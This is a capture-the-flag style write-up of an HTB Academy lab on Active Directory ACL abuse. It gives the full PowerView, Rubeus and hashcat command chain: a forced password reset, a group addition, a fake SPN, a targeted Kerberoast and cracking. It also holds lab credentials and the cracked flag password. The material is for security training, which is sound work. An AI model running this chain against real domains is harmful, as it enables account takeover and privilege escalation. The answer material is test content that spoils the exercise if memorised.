### CPTS / HTB Penetration Tester Path <br>
### Active Directory Enumeration & Attacks: ACL Abuse Tactics <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### ACL Abuse Tactics

Attack chain: `wley` (creds from Responder + hashcat) → ForceChangePassword `damundsen` → GenericWrite `Help Desk Level 1` → nested into `Information Technology` → GenericAll `adunn` → DCSync.

<br>

---

<br>

### Force Change damundsen's Password (as wley)

Build PSCredential for wley:

```diff
+ PS> $SecPassword = ConvertTo-SecureString '<wley pw>' -AsPlainText -Force
+ PS> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

<br>

Build new password as SecureString:

```diff
+ PS> $damundsenPassword = ConvertTo-SecureString 'NewPw1!' -AsPlainText -Force
```

<br>

Force-reset:

```diff
+ PS> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

<br>

---

<br>

### Add damundsen to Help Desk Level 1 (GenericWrite)

Build damundsen creds, add to group:

```diff
+ PS> $SecPassword = ConvertTo-SecureString 'NewPw1!' -AsPlainText -Force
+ PS> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
+ PS> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

<br>

Verify:

```diff
+ PS> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

<br>

---

<br>

### Targeted Kerberoast adunn (GenericAll → set fake SPN)

Set arbitrary SPN on the target via `Set-DomainObject`:

```diff
+ PS> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/legit'} -Verbose
```

<br>

Kerberoast with Rubeus:

```diff
+ PS> .\Rubeus.exe kerberoast /user:adunn /nowrap
```

<br>

Crack the TGS:

```diff
+ $ hashcat -m 13100 adunn.txt rockyou.txt
```

<br>

Always remove the fake SPN when done: clean up after yourself.

<br>

---

<br>

### ACL Abuse Tactics Exercise

IP: 10.129.175.62

RDP `htb-student:Academy_student_AD!`.

---

### Question 1:
Work through the examples in this section to gain a better understanding of ACL abuse and performing these skills hands-on. Set a fake SPN for the adunn account, Kerberoast the user, and crack the hash using Hashcat. Submit the account's cleartext password as your answer.

#### RDP with a shared dir, walk the full chain: wley creds → reset damundsen → add damundsen to Help Desk → set fake SPN on adunn → Rubeus kerberoast → hashcat.

```diff
+ $ xfreerdp /v:10.129.175.62 /u:htb-student /p:'Academy_student_AD!' /dynamic-resolution /drive:foobar,/home/htb-ac-830862/foobar/
+ PS> cd c:\Tools
+ PS> Import-Module .\PowerView.ps1
+ PS> $SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
+ PS> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+ PS> $damundsenPassword = ConvertTo-SecureString 'dootdoot1!' -AsPlainText -Force
+ PS> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+ PS> $SecPassword = ConvertTo-SecureString 'dootdoot1!' -AsPlainText -Force
+ PS> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
+ PS> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+ PS> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='releasethe/epsteinfiles'} -Verbose
+ PS> .\Rubeus.exe kerberoast /user:adunn /nowrap
```

<br>

Drag the hash to the Linux share, run hashcat:

```diff
+ $ hashcat -m 13100 adunn.txt rockyou.txt
```

	$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$releasethe/epsteinfiles@INLANEFREIGHT.LOCAL*...:SyncMaster757

&#x1F6A9; found **SyncMa--edit--757**.
